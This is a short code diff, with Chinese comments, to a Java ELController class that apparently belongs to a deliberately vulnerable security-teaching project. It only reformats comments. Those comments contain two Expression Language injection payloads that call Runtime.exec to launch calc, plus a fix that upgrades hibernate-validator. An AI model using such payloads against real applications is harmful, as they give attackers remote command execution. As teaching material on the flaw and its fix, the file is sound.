@@ -22,7 +22,8 @@ public class ELController {
      * 攻击者传入?url=${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')}
      * 即可执行系统命令
      *
-     * 或 ?url=${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}
+     * 或
+     * ?url=${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}
      *
      * 参考: https://securitylab.github.com/research/bean-validation-RCE/
      */
@@ -49,5 +50,5 @@ public class ELController {
 
     /**
      * 修复漏洞，升级hibernate-validator到无漏洞版本，或替换为 org.apache.bval:bval-jsr
-    */
+     */
 }
